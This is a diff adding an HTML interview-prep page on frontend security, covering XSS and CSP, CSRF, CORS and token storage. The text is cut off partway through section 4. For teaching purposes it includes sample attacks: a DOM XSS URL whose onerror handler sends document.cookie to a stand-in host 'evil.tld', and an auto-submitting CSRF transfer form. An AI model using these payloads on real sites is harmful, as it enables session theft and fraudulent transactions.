@@ -1,0 +1,1356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>18 — Security, Networking &amp; UI/UX Engineering | Interview Prep</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="container">
+    <div class="breadcrumb"><a href="index.html">← Course Home</a></div>
+    <h1>18 — Security, Networking &amp; UI/UX Engineering</h1>
+    <p>XSS/CSP · CSRF · CORS · token storage · HTTP caching &amp; H2/H3 · WebSockets vs SSE · design systems · i18n · dark mode · motion a11y — the breadth round, at senior depth.</p>
+  </div>
+</header>
+
+<main class="container">
+
+  <section>
+    <h2>Why interviewers ask this</h2>
+    <p>
+      Security questions are the sharpest senior/mid separator in frontend loops. A mid-level engineer can build features;
+      a senior engineer is trusted <em>not to ship the vulnerability that leaks every user's session</em>. Interviewers probe
+      XSS, CSRF, and CORS because they expose whether you understand the browser's trust model — origins, cookies, and the
+      same-origin policy — or whether you've just been cargo-culting <code>Access-Control-Allow-Origin: *</code> until the error
+      went away. The tell is precision: candidates who can say <em>exactly</em> what a CSP nonce does, <em>exactly</em> which
+      requests trigger a preflight, and <em>exactly</em> what <code>SameSite=Lax</code> still allows, read as engineers who can
+      own an app's security posture. Everything here is defensive: how to protect users and apps, argued with mechanisms, not slogans.
+    </p>
+    <p>
+      The networking third (caching, HTTP/2/3, WebSockets vs SSE) tests systems thinking — whether you understand the machine
+      between your bundle and the user, which is where most real-world latency and most "works on my machine" bugs live.
+      The UI/UX engineering third (design systems, i18n, dark mode, motion accessibility) probes product maturity at scale:
+      have you built for 40 locales, three brands, and users with vestibular disorders — or only for the happy path?
+      Product-minded startups weight this heavily; FAANG asks it in the "frontend breadth" round. This is the final tutorial:
+      it's wide by design, with tiers telling you where airtight beats aware.
+    </p>
+  </section>
+
+  <div class="toc">
+    <strong>On this page</strong>
+    <ul>
+      <li><a href="#xss">1. XSS &amp; Content Security Policy</a> <span class="tier tier-1">T1</span></li>
+      <li><a href="#csrf">2. CSRF</a> <span class="tier tier-1">T1</span></li>
+      <li><a href="#cors">3. CORS</a> <span class="tier tier-1">T1</span></li>
+      <li><a href="#auth-storage">4. Token storage &amp; auth patterns</a> <span class="tier tier-1">T1</span></li>
+      <li><a href="#headers">5. Security headers &amp; platform defenses</a> <span class="tier tier-2">T2</span></li>
+      <li><a href="#http-caching">6. HTTP caching</a> <span class="tier tier-1">T1</span></li>
+      <li><a href="#http23">7. HTTP/1.1 → HTTP/2 → HTTP/3</a> <span class="tier tier-2">T2</span></li>
+      <li><a href="#realtime">8. WebSockets vs SSE vs polling</a> <span class="tier tier-2">T2</span></li>
+      <li><a href="#design-systems">9. Design systems &amp; design tokens</a> <span class="tier tier-2">T2</span></li>
+      <li><a href="#i18n">10. Internationalization</a> <span class="tier tier-2">T2</span></li>
+      <li><a href="#dark-mode">11. Dark mode &amp; theming</a> <span class="tier tier-3">T3</span></li>
+      <li><a href="#motion-a11y">12. Motion, animation &amp; accessibility</a> <span class="tier tier-3">T3</span></li>
+      <li><a href="#qa">Interview Q&amp;A</a></li>
+      <li><a href="#exercises">Hands-on exercises</a></li>
+    </ul>
+  </div>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="xss">1. XSS &amp; Content Security Policy <span class="tier tier-1">T1</span></h2>
+    <p>
+      Cross-site scripting means <strong>attacker-controlled JavaScript executes in your origin</strong>. That single sentence
+      is why XSS is the worst client-side bug class: once script runs in your origin, the same-origin policy — the browser's
+      entire security model — works <em>for</em> the attacker. They can read the DOM (including anything the user can see),
+      call your APIs with the user's cookies, exfiltrate tokens from <code>localStorage</code>, keylog password fields, and
+      rewrite the page into a phishing form. XSS isn't "an alert box"; it's full account compromise for every user who views
+      the injected content.
+    </p>
+
+    <h3>The three flavors</h3>
+    <table>
+      <thead><tr><th>Type</th><th>Payload lives in…</th><th>Reaches the victim via…</th><th>Example</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Reflected</strong></td><td>The request itself (query string, form field)</td><td>A crafted link the victim clicks; server echoes the input into the response HTML</td><td><code>/search?q=&lt;script&gt;…&lt;/script&gt;</code> rendered as "Results for &lt;script&gt;…"</td></tr>
+        <tr><td><strong>Stored</strong></td><td>Your database (comment, profile bio, ticket title)</td><td>Every user who views the page — no link-clicking required; wormable</td><td>A product review containing <code>&lt;img src=x onerror=…&gt;</code> shown to all shoppers</td></tr>
+        <tr><td><strong>DOM-based</strong></td><td>Never touches the server — a client-side <em>source</em> flows into a <em>sink</em></td><td>URL fragment, <code>postMessage</code>, query param read by JS and written into the DOM unsafely</td><td><code>el.innerHTML = location.hash.slice(1)</code></td></tr>
+      </tbody>
+    </table>
+    <p>
+      DOM XSS is the frontend engineer's special responsibility: the server-side team's escaping and WAF never see it,
+      because the payload travels in the fragment (<code>#…</code> is not even sent to the server) or arrives via
+      <code>postMessage</code>. Think in terms of <strong>sources</strong> (attacker-influenced inputs: <code>location.*</code>,
+      <code>document.referrer</code>, <code>window.name</code>, <code>postMessage</code> data, storage another page wrote) and
+      <strong>sinks</strong> (execution points: <code>innerHTML</code>, <code>outerHTML</code>, <code>insertAdjacentHTML</code>,
+      <code>document.write</code>, <code>eval</code>/<code>new Function</code>, <code>setTimeout(string)</code>,
+      <code>script.src</code>, <code>a.href</code> with a <code>javascript:</code> URL).
+    </p>
+<pre><code><span class="com">// DOM XSS in three lines — no server involved:</span>
+<span class="com">// URL: https://app.example/#&lt;img src=x onerror="fetch('//evil.tld/?c='+document.cookie)"&gt;</span>
+<span class="kw">const</span> banner = document.querySelector(<span class="str">'#banner'</span>);
+banner.innerHTML = <span class="str">'Welcome back, '</span> + decodeURIComponent(location.hash.slice(<span class="num">1</span>)); <span class="com">// sink ← source</span></code></pre>
+
+    <h3>What React actually protects — and where it doesn't</h3>
+    <p>
+      JSX interpolation (<code>{userInput}</code>) escapes strings before they become text nodes or attribute values —
+      <code>&lt;</code> becomes <code>&amp;lt;</code>, so injected markup renders as inert text. That kills the classic
+      "echo into HTML" bug class by default, which is a genuinely huge win. But React's escaping covers <em>one context</em>:
+      values rendered as content. Every senior interview asks for the escape hatches:
+    </p>
+    <ul>
+      <li><strong><code>dangerouslySetInnerHTML</code></strong> — the name is the documentation. Any user-influenced string here is DOM XSS. This includes "our CMS returns HTML" and "we render markdown" — markdown renderers emit HTML, and raw-HTML passthrough is often on by default.</li>
+      <li><strong>URL attributes:</strong> <code>&lt;a href={userUrl}&gt;</code> with <code>javascript:alert(1)</code> executes on click. Escaping doesn't help — it's a perfectly valid attribute value; the <em>protocol</em> is the attack. React warns on <code>javascript:</code> URLs but you must validate: allowlist <code>http:</code>/<code>https:</code>/<code>mailto:</code> (parse with <code>new URL()</code>, don't regex).</li>
+      <li><strong>Props that reach sinks:</strong> spreading unvalidated objects (<code>{...userControlled}</code>) can smuggle <code>dangerouslySetInnerHTML</code> or event handlers into an element.</li>
+      <li><strong>SSR state injection:</strong> serializing state into <code>&lt;script&gt;window.__STATE__ = {...}&lt;/script&gt;</code> — if the JSON contains <code>&lt;/script&gt;</code>, the parser closes your tag early and the rest is attacker HTML. Escape <code>&lt;</code> as <code>\u003C</code> when serializing (serialize-javascript / <code>JSON.stringify</code> + replace).</li>
+      <li><strong>Third-party components and refs:</strong> anything that takes an <code>html</code> prop, jQuery-era plugins behind a ref, chart libraries that render labels as HTML.</li>
+    </ul>
+    <div class="pitfall">
+      Saying "React prevents XSS" in an interview is a mid-level answer that invites the follow-up that sinks you.
+      The senior version: "React <em>escapes rendered text</em> by default, which eliminates injection into the content context —
+      but it does nothing for <code>dangerouslySetInnerHTML</code>, <code>javascript:</code> URLs, SSR state serialization, or
+      third-party HTML, so we treat those as the audit surface."
+    </div>
+
+    <h3>Sanitization: DOMPurify, and escaping vs sanitizing</h3>
+    <p>
+      Two different tools for two different jobs. <strong>Escaping</strong> makes data inert in a given context (HTML-encode for
+      content, attribute-encode for attributes, <code>\u003C</code> for script contexts) — use it when the data should be
+      <em>text</em>. <strong>Sanitizing</strong> parses untrusted HTML and strips everything not on an allowlist — use it when the
+      data is <em>supposed to be HTML</em> (rich-text editors, CMS content, markdown output). Never write your own sanitizer;
+      HTML parsing has mutation tricks (mXSS) that defeat naive regex filters. The standard is <strong>DOMPurify</strong>:
+    </p>
+<pre><code><span class="kw">import</span> DOMPurify <span class="kw">from</span> <span class="str">'dompurify'</span>;
+
+<span class="kw">function</span> <span class="typ">RichText</span>({ html }) {
+  <span class="kw">const</span> clean = DOMPurify.sanitize(html, {
+    ALLOWED_TAGS: [<span class="str">'p'</span>, <span class="str">'b'</span>, <span class="str">'i'</span>, <span class="str">'em'</span>, <span class="str">'strong'</span>, <span class="str">'a'</span>, <span class="str">'ul'</span>, <span class="str">'ol'</span>, <span class="str">'li'</span>, <span class="str">'code'</span>, <span class="str">'pre'</span>],
+    ALLOWED_ATTR: [<span class="str">'href'</span>],           <span class="com">// DOMPurify also strips javascript: URLs by default</span>
+  });
+  <span class="kw">return</span> &lt;div dangerouslySetInnerHTML={{ __html: clean }} /&gt;;   <span class="com">// sanitize at the point of use</span>
+}</code></pre>
+    <p>
+      Sanitize <strong>at render time</strong> (or at least on output), not only on input — data stored years ago predates your
+      current rules, and other write paths (imports, admin tools, older APIs) bypass input filters. The platform is also
+      catching up: the native <strong>Sanitizer API</strong> (<code>setHTML()</code>) ships this behavior in the browser, worth
+      naming as the direction of travel.
+    </p>
+
+    <h3>Trusted Types: make the sinks type-check</h3>
+    <p>
+      Trusted Types is the structural fix for DOM XSS: a CSP directive that makes dangerous sinks (<code>innerHTML</code>,
+      <code>script.src</code>, <code>eval</code>…) <em>reject plain strings</em>. Only typed objects created by a named, audited
+      policy are accepted — so instead of hunting hundreds of sinks across your codebase, you audit the two or three policies
+      that are allowed to produce HTML:
+    </p>
+<pre><code><span class="com"># Response header — enforce:</span>
+Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify
+
+<span class="com">// Now el.innerHTML = someString throws a TypeError.</span>
+<span class="com">// DOMPurify can return TrustedHTML directly:</span>
+<span class="kw">const</span> clean = DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: <span class="kw">true</span> });
+el.innerHTML = clean;   <span class="com">// OK — TrustedHTML from the 'dompurify' policy</span></code></pre>
+    <p>
+      Rollout reality: run report-only first, fix the violations (often in dependencies), then enforce. Chromium-shipped;
+      other engines have been implementing — pitch it as "eliminates DOM XSS as a bug class in supporting browsers" rather
+      than a universal guarantee.
+    </p>
+
+    <h3>Content Security Policy</h3>
+    <p>
+      CSP is a response header that tells the browser <em>what is allowed to load and execute</em> on the page. Its core
+      anti-XSS value: a strong policy means that <em>even if</em> markup injection succeeds, the injected script doesn't run —
+      because inline script is banned and the attacker can't produce a valid nonce. Directive vocabulary you should command:
+    </p>
+    <table>
+      <thead><tr><th>Directive</th><th>Controls</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td><code>default-src</code></td><td>Fallback for most *-src directives</td><td>Start at <code>'self'</code>; everything not overridden inherits it</td></tr>
+        <tr><td><code>script-src</code></td><td>JS: external, inline, eval</td><td>The anti-XSS directive — this is where nonces/hashes live</td></tr>
+        <tr><td><code>style-src</code></td><td>CSS: external, inline</td><td>Inline styles are widely used; often needs nonces or (pragmatically) <code>'unsafe-inline'</code></td></tr>
+        <tr><td><code>img-src</code>, <code>font-src</code>, <code>media-src</code></td><td>Respective resource types</td><td>Loose here is low-risk; images are a common exfil channel though</td></tr>
+        <tr><td><code>connect-src</code></td><td><code>fetch</code>/XHR/WebSocket/SSE targets</td><td>Limits where injected script can exfiltrate to — underrated</td></tr>
+        <tr><td><code>frame-ancestors</code></td><td>Who may iframe <em>this</em> page</td><td>The clickjacking defense; replaces <code>X-Frame-Options</code> (§5)</td></tr>
+        <tr><td><code>frame-src</code> / <code>child-src</code></td><td>What this page may iframe</td><td>Constrain embedded third parties</td></tr>
+        <tr><td><code>base-uri</code></td><td>Allowed <code>&lt;base href&gt;</code></td><td>Set <code>'none'</code>/<code>'self'</code> — injected <code>&lt;base&gt;</code> can hijack all relative URLs</td></tr>
+        <tr><td><code>object-src</code></td><td>Plugins (<code>&lt;object&gt;</code>/<code>&lt;embed&gt;</code>)</td><td>Always <code>'none'</code></td></tr>
+        <tr><td><code>form-action</code></td><td>Where forms may submit</td><td>Blocks injected forms posting credentials elsewhere</td></tr>
+        <tr><td><code>report-to</code> / <code>report-uri</code></td><td>Violation reporting endpoint</td><td>How you monitor in production</td></tr>
+      </tbody>
+    </table>
+
+    <h4>Nonces and strict-dynamic — the modern policy</h4>
+    <p>
+      Allowlist-based CSP (<code>script-src 'self' cdn.example.com</code>) is largely a dead end: research (Google's "CSP Is
+      Dead, Long Live CSP") showed most allowlist policies are bypassable via JSONP endpoints or Angular-style gadgets on the
+      allowed domains. The modern pattern is <strong>nonce-based, strict CSP</strong>:
+    </p>
+<pre><code>Content-Security-Policy:
+  script-src 'nonce-r4nd0mBase64' 'strict-dynamic' https: 'unsafe-inline';
+  object-src 'none';
+  base-uri 'none';</code></pre>
+    <ul>
+      <li>The server generates a fresh random <strong>nonce per response</strong> and stamps it on every legitimate <code>&lt;script nonce="…"&gt;</code>. Injected scripts don't know the nonce → they don't run. (Nonces must be unpredictable and never reused — a static nonce is no CSP at all.)</li>
+      <li><strong><code>'strict-dynamic'</code></strong> says: any script loaded <em>by</em> a nonced script is also trusted. That's how bundlers/loaders that inject <code>&lt;script&gt;</code> chunks keep working without allowlisting every CDN path.</li>
+      <li>The trailing <code>https: 'unsafe-inline'</code> are <em>backwards-compat fallbacks</em>: modern browsers that understand <code>'strict-dynamic'</code> ignore them; ancient browsers fall back to something functional. Interviewers love this detail.</li>
+      <li>Deploy with <code>Content-Security-Policy-Report-Only</code> first, watch violation reports, then enforce. SPAs with static HTML hosting can't mint per-response nonces — use hashes of the inline bootstrap scripts, or move the nonce-stamping to the edge/CDN function.</li>
+    </ul>
+    <div class="senior">
+      Frame CSP correctly: it is <strong>defense-in-depth, not the primary defense</strong>. The primary defenses are output
+      escaping (React's default), sanitization of intentional HTML (DOMPurify), and URL/protocol validation. CSP is the layer
+      that limits blast radius when one of those fails — and its violation reports double as a production XSS <em>detector</em>.
+      Saying "we'd add CSP so we don't need to sanitize" is the trap answer; each layer covers different failure modes.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="csrf">2. CSRF <span class="tier tier-1">T1</span></h2>
+    <p>
+      Cross-site request forgery: an attacker's page makes the victim's browser send a <strong>state-changing request to your
+      app, carrying the victim's credentials</strong> — because the browser attaches cookies automatically to requests to your
+      domain <em>no matter which site initiated them</em>. The attacker never sees the response and never learns the cookie;
+      they don't need to. They just need the request to <em>happen</em>: transfer money, change the account email, delete a
+      resource, escalate a role.
+    </p>
+
+    <h3>Anatomy of the attack</h3>
+<pre><code><span class="com">&lt;!-- evil.example — the victim merely visits this page while logged in to bank.example --&gt;</span>
+&lt;form action=<span class="str">"https://bank.example/transfer"</span> method=<span class="str">"POST"</span>&gt;
+  &lt;input type=<span class="str">"hidden"</span> name=<span class="str">"to"</span> value=<span class="str">"attacker-acct"</span>&gt;
+  &lt;input type=<span class="str">"hidden"</span> name=<span class="str">"amount"</span> value=<span class="str">"5000"</span>&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[<span class="num">0</span>].submit();&lt;/script&gt;
+
+<span class="com">&lt;!-- GET variant — if your GET endpoints mutate state, an &lt;img&gt; is enough: --&gt;</span>
+&lt;img src=<span class="str">"https://bank.example/transfer?to=attacker&amp;amount=5000"</span>&gt;</code></pre>
+    <p>
+      Note what the attacker exploits: <strong>cross-site form posts and resource loads are allowed by the same-origin
+      policy</strong> (SOP restricts <em>reading</em> cross-origin responses, not <em>sending</em> requests — see §3), and the
+      browser's ambient cookie attachment. That's why CSRF specifically targets <strong>cookie-authenticated</strong> apps.
+      An API authenticated by an <code>Authorization: Bearer …</code> header is inherently CSRF-resistant: the attacker's page
+      cannot make the browser attach that header — attaching custom headers requires JS with <code>fetch</code>, which is
+      governed by CORS, and the attacker can't read the token to attach it anyway.
+    </p>
+
+    <h3>SameSite cookies — the platform-level fix</h3>
+    <table>
+      <thead><tr><th>Value</th><th>Cookie sent on cross-site requests?</th><th>Consequences</th></tr></thead>
+      <tbody>
+        <tr><td><code>SameSite=Strict</code></td><td>Never</td><td>Maximum CSRF protection — but also: following an emailed link to your app arrives <em>logged-out-looking</em> (no cookie on that top-level navigation). Often used for the "action" cookie in a two-cookie pattern.</td></tr>
+        <tr><td><code>SameSite=Lax</code></td><td>Only on <strong>top-level navigations</strong> with <strong>safe methods</strong> (GET)</td><td>The pragmatic default. Blocks cross-site POSTs, iframes, images, fetch — the CSRF vectors — while keeping normal link-following logged in.</td></tr>
+        <tr><td><code>SameSite=None; Secure</code></td><td>Always (HTTPS only)</td><td>Required for legitimate cross-site use: third-party widgets, cross-site iframes, some SSO flows. <code>Secure</code> is mandatory or the cookie is rejected.</td></tr>
+      </tbody>
+    </table>
+    <p>
+      Chrome has defaulted unspecified cookies to <code>Lax</code> since 2020 (with a "Lax + POST" 2-minute grace quirk for
+      login flows), and other browsers follow the same direction — so the ambient-cookie world that made CSRF trivial is
+      largely gone <em>by default</em>. Two nuances interviewers fish for:
+    </p>
+    <ul>
+      <li><strong>The Lax GET hole:</strong> Lax still sends the cookie on top-level GET navigation. If any state-changing endpoint accepts GET (<code>/logout</code>, <code>/approve?id=…</code>, that quick hack from 2019), <code>&lt;a href&gt;</code> or <code>window.location</code> from the attacker's page rides the session. Defense: honor HTTP semantics — GET must be safe/idempotent, mutations require POST/PUT/DELETE.</li>
+      <li><strong>"Site" ≠ "origin":</strong> SameSite is scoped to the <em>registrable domain</em> (eTLD+1, plus scheme). <code>app.example.com</code> and <code>evil.example.com</code> are the <em>same site</em> — SameSite gives zero protection against a compromised or attacker-controlled sibling subdomain. Origin-level isolation needs more (see tokens, and <code>__Host-</code> prefixes in §4).</li>
+    </ul>
+
+    <h3>Anti-CSRF tokens</h3>
+    <p>
+      The classical defense, still required for defense-in-depth and for older browsers: prove the request originated from
+      your own UI by including a secret the attacker's page cannot read (SOP blocks them from reading your pages).
+    </p>
+    <ul>
+      <li><strong>Synchronizer token:</strong> server generates a random token bound to the session, embeds it in the rendered form / exposes it via an endpoint; every mutating request must echo it in a body field or header; server compares against the stored value. Gold standard; needs server-side session state (or signed tokens).</li>
+      <li><strong>Double-submit cookie:</strong> stateless variant — server sets a random token as a cookie <em>and</em> requires the same value in a header/body field; attacker can make the cookie be <em>sent</em> but can't <em>read</em> it to copy into the field. Weakness: anyone who can set cookies for the parent domain (subdomain takeover, MITM on an HTTP sibling) can plant a known token — the signed variant (HMAC of session ID) closes this.</li>
+      <li><strong>Custom-header check:</strong> require e.g. <code>X-Requested-With</code> or any custom header on mutations. Forms can't set headers; <code>fetch</code> with a custom header becomes <em>preflighted</em> (§3), and your server simply doesn't approve cross-origin preflights. Cheap and effective for JSON APIs — this is why "just require <code>Content-Type: application/json</code> and verify it" is also meaningful (form enctypes can't produce it without a preflight).</li>
+      <li><strong>Origin/Referer validation:</strong> modern browsers send <code>Origin</code> or <code>Sec-Fetch-Site</code> on cross-site requests — reject mutations whose <code>Sec-Fetch-Site: cross-site</code>. Fetch-metadata headers are the low-effort modern layer.</li>
+    </ul>
+    <div class="pitfall">
+      "We use JWTs so we're safe from CSRF" is only true <strong>if the JWT travels in a header</strong>. Teams that put the
+      JWT in a cookie (for SSR or convenience) have rebuilt cookie auth and re-inherited CSRF — the token format is irrelevant;
+      the <em>transport</em> is what matters. Conversely, "we're safe because SameSite" fails on the GET hole, same-site
+      subdomains, and browsers/config you don't control. Ship SameSite=Lax/Strict <em>and</em> a token or header check.
+    </div>
+    <div class="senior">
+      Also know <strong>login CSRF</strong> (attacker submits <em>their</em> credentials to your login form in the victim's
+      browser, so the victim unknowingly operates inside the attacker's account — searches, saved cards, uploaded documents
+      accrue to the attacker): it's why the login form itself needs CSRF protection, which surprises people because "there's
+      no session yet."
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="cors">3. CORS <span class="tier tier-1">T1</span></h2>
+    <p>
+      You cannot explain CORS without the <strong>same-origin policy</strong> first, because CORS is not a security wall —
+      it's a controlled <em>relaxation</em> of one.
+    </p>
+
+    <h3>Same-origin policy, precisely</h3>
+    <p>
+      An <strong>origin</strong> is the triple <strong>scheme + host + port</strong>. <code>https://app.example.com</code>,
+      <code>http://app.example.com</code>, <code>https://api.example.com</code>, and <code>https://app.example.com:8443</code>
+      are four different origins. The SOP's core rule: <strong>script running in one origin may not read responses (or reach
+      into documents) from another origin</strong>. Note what it does <em>not</em> block:
+    </p>
+    <ul>
+      <li><strong>Sending</strong> is broadly allowed: form posts, <code>&lt;img&gt;</code>/<code>&lt;script&gt;</code>/<code>&lt;link&gt;</code> loads, and top-level navigations go cross-origin freely (this permissiveness is exactly what CSRF exploits — §2).</li>
+      <li><strong>Embedding</strong> is allowed: you can iframe, display an image from, or run a script from another origin — you just can't <em>read</em> the pixels/source cross-origin.</li>
+      <li>What's blocked is <strong>reading</strong>: <code>fetch()</code> to another origin without CORS gets a network-level error in JS; a cross-origin iframe's DOM is inaccessible.</li>
+    </ul>
+    <p>
+      CORS (Cross-Origin Resource Sharing) is the protocol by which a <strong>server opts in</strong> to letting specific
+      foreign origins read its responses. The browser enforces; the server declares.
+    </p>
+
+    <h3>Simple vs preflighted requests — exact triggers</h3>
+    <p>A request is <strong>"simple"</strong> (sent immediately, no preflight) only if <em>all</em> of these hold:</p>
+    <ul>
+      <li>Method is <code>GET</code>, <code>HEAD</code>, or <code>POST</code>;</li>
+      <li>Only CORS-safelisted headers are set manually (<code>Accept</code>, <code>Accept-Language</code>, <code>Content-Language</code>, <code>Content-Type</code>);</li>
+      <li>If <code>Content-Type</code> is set, it is one of <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code> — the types an HTML form could always produce.</li>
+    </ul>
+    <p>
+      The design logic: simple requests are exactly what the pre-CORS web could already send (forms, image tags), so allowing
+      them adds no new attack surface. <strong>They are still sent to the server</strong> — only the <em>response read</em> is
+      blocked without the right headers. Anything beyond that envelope — <code>PUT</code>/<code>DELETE</code>/<code>PATCH</code>,
+      <code>Content-Type: application/json</code>, an <code>Authorization</code> or any custom header — is <em>new capability</em>,
+      so the browser first asks permission with a <strong>preflight</strong>.
+    </p>
+
+    <h3>The preflight handshake</h3>
+<pre><code><span class="com">── 1. Browser sends OPTIONS (no body, no credentials by default) ──────────</span>
+OPTIONS /v1/orders HTTP/1.1
+Origin: https://app.example.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: content-type, authorization
+
+<span class="com">── 2. Server approves (or the whole thing dies here) ──────────────────────</span>
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://app.example.com
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Max-Age: 86400        <span class="com"># cache this verdict — skip preflights for a day (browsers cap it)</span>
+Vary: Origin
+
+<span class="com">── 3. Only now does the actual PUT go out; its response ALSO needs ────────</span>
+<span class="com">──    Access-Control-Allow-Origin, or the read is blocked. ────────────────</span></code></pre>
+    <p>
+      When a preflight fails (missing/mismatched headers, non-2xx, or a redirect — preflights must not redirect), the browser
+      never sends the real request, and JS sees an opaque <code>TypeError: Failed to fetch</code> — deliberately detail-free so
+      probing is harder. The real diagnosis lives in the DevTools Network panel and the console's CORS message.
+    </p>
+
+    <h3>Credentialed requests — the strict mode</h3>
+    <p>By default, cross-origin <code>fetch</code> sends no cookies. Opting in tightens everything:</p>
+<pre><code>fetch(<span class="str">'https://api.example.com/me'</span>, { credentials: <span class="str">'include'</span> });
+
+<span class="com"># Server must now respond with ALL of:</span>
+Access-Control-Allow-Origin: https://app.example.com   <span class="com"># wildcard * is FORBIDDEN with credentials</span>
+Access-Control-Allow-Credentials: true
+Vary: Origin</code></pre>
+    <ul>
+      <li><strong>No wildcards anywhere</strong> in credentials mode: <code>Allow-Origin</code>, <code>Allow-Headers</code>, and <code>Allow-Methods</code> must be explicit values, and the browser refuses <code>*</code>. Rationale: "any site on the internet may read responses carrying the user's session" should never be one config value away.</li>
+      <li>The cookie itself must survive the third-party context: <code>SameSite=None; Secure</code> if app and API are on different <em>sites</em> (different eTLD+1). Subdomains of one registrable domain are the <em>same site</em>, so <code>app.example.com → api.example.com</code> keeps its cookies even with <code>Lax</code> — cross-origin but same-site. Truly cross-site setups need <code>SameSite=None</code> and increasingly collide with third-party-cookie phase-outs — a real argument for the BFF pattern (§4).</li>
+    </ul>
+
+    <h3>Common failure modes (the debugging question)</h3>
+    <ul>
+      <li><strong>Server echoes <code>Origin</code> blindly</strong> with <code>Allow-Credentials: true</code> — functionally equivalent to <code>*</code> with credentials, i.e., every website can read your users' authenticated data. Echo only after validating against an allowlist.</li>
+      <li><strong>Missing <code>Vary: Origin</code></strong> — a CDN/proxy caches the response including its <code>Access-Control-Allow-Origin: https://a.example</code> header, then serves that cached copy to <code>b.example</code>, whose reads now fail (or worse, succeed for the wrong origin). Any origin-dependent CORS response must declare <code>Vary: Origin</code>.</li>
+      <li><strong>Redirects:</strong> a preflighted request whose preflight hits a redirect fails outright; and a redirect on the actual request re-runs CORS checks against the new URL — the classic "works locally, fails behind the http→https or trailing-slash redirect."</li>
+      <li><strong>Error responses without CORS headers:</strong> the API gateway adds CORS headers on 200s but the error path (4xx/5xx from a different layer) doesn't — so the client can never <em>read</em> the error, and every failure looks like "CORS error" instead of the actual 401. CORS headers must be on every response, including errors.</li>
+      <li><strong><code>no-cors</code> mode misunderstanding:</strong> <code>fetch(url, { mode: 'no-cors' })</code> doesn't "bypass CORS" — it returns an <em>opaque</em> response: status 0, no body, no headers. It exists for fire-and-forget and caching edge cases, not for reading data.</li>
+    </ul>
+    <div class="senior">
+      The framing that lands: <strong>CORS protects users, not servers</strong>. The server receives simple cross-origin
+      requests regardless; anyone with curl can call your API all day — CORS never enters the picture outside a browser.
+      What CORS prevents is a malicious <em>website</em> using the <em>victim's browser</em> (with its cookies, its intranet
+      position, its IP) to read data as that victim. So: CORS is not your API's auth layer, and "we locked down CORS" says
+      nothing about server-side authorization. Preflights are the browser protecting <em>servers</em> from new-shaped requests
+      old servers never expected — the one server-protecting piece of the design.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section>
+    <h2 id="auth-storage">4. Token storage &amp; auth patterns <span class="tier tier-1">T1</span></h2>
+    <p>
+      "Where do you store the JWT — localStorage or a cookie?" is a near-guaranteed senior question, and it's a trap for
+      one-line answers in either direction. The senior move is to argue the actual threat model, name what each choice
+      concedes, and land on the layered pattern most serious teams converge on.
+    </p>
+
+    <h3>The localStorage vs cookie argument, done properly</h3>
+    <table>
+      <thead><tr><th></th><th>Token in <code>localStorage</code> (sent via header)</th><th>Session in <code>httpOnly</code> cookie</th></tr></thead>
+      <tbody>
+        <tr><td><strong>CSRF</strong></td><td>Immune — attacker pages can't attach your header</td><td>Vulnerable by default → needs SameSite + token/header defense (§2)</td></tr>
+        <tr><td><strong>XSS: token theft</strong></td><td><strong>Exfiltratable</strong> — one injected script reads it and ships it off; the attacker then uses it from their own machine, any IP, until expiry — even after the user closes the tab and you patch the bug</td><td>Not readable by JS (<code>httpOnly</code>) — cannot be exfiltrated</td></tr>
+        <tr><td><strong>XSS: session riding</strong></td><td>Also possible (the script can just call your API)</td><td>Possible — injected script calls your API and the cookie rides along ("on-site request forgery")</td></tr>
+        <tr><td><strong>Sent automatically</strong></td><td>No — you attach it, only where you choose</td><td>Yes — on every matching request (which is why CSRF exists)</td></tr>
+        <tr><td><strong>Works for SSR / first paint</strong></td><td>Awkward — the server never sees it on document requests</td><td>Yes — arrives with the HTML request</td></tr>
+        <tr><td><strong>Size / transport cost</strong></td><td>Only on API calls</td><td>On <em>every</em> matching request unless path-scoped; ~4 KB limit</td></tr>
+      </tbody>
+    </table>
+    <p>
+      The honest core of the argument: <strong>under XSS, both lose — but they lose differently.</strong> With localStorage the
+      attacker gets the <em>credential itself</em>: offline, replayable, persistent beyond the page, sellable. With an httpOnly
+      cookie the attacker gets <em>use of the session while their script runs in a victim's open page</em> — bad, but bounded:
+      no offline replay, nothing durable after the tab closes, and server-side session revocation kills it. "httpOnly doesn't
+      save you from XSS" is true; "therefore the choices are equivalent" is not — exfiltration is strictly worse than riding.
+      That asymmetry, plus the fact that CSRF has a platform-level answer (SameSite) while stolen-readable-storage has none,
+      is why security guidance converges on httpOnly cookies for browser session credentials.
+    </p>
+    <div class="pitfall">
+      <code>sessionStorage</code> is not a security upgrade over <code>localStorage</code> — same-origin JS reads both; it only
+      narrows lifetime and tab scope. And "we encrypt the token in localStorage" changes nothing: the decryption key lives in
+      the same JS context the attacker's script runs in.
+    </div>
+
+    <h3>Cookie hardening checklist</h3>
+<pre><code>Set-Cookie: __Host-session=abc123;
+  HttpOnly;          <span class="com"># no JS access — kills exfiltration</span>
+  Secure;            <span class="com"># HTTPS only — never on the wire in clear</span>
+  SameSite=Lax;      <span class="com"># CSRF baseline (Strict for high-value action cookies)</span>
+  Path=/;            <span class="com"># __Host- prefix REQUIRES Secure, Path=/, no Domain attribute:</span>
+                     <span class="com"># subdomains can't set or shadow it — locked to this exact host</span>
+  Max-Age=1800</code></pre>
+
+    <h3>The modern SPA pattern: access token in memory, refresh token in a cookie</h3>
+    <ul>
